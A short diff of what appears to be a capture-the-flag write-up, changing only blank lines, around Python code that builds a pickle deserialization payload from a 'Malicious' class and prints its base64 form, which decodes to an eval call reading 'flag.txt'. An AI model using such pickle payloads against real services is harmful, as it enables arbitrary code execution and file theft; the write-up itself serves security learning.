@@ -79,10 +79,12 @@ class Malicious:
 payload = pickle.dumps(Malicious())
 encoded = base64.b64encode(payload).decode()
 print(encoded)
+
 ```
 we will run this and we will get the base64 code encoded with the payload.
 ```
 gASVMwAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwXb3BlbignZmxhZy50eHQnKS5yZWFkKCmUhZRSlC4=
+
 ```
 
 this will be the base64 version of the payload.
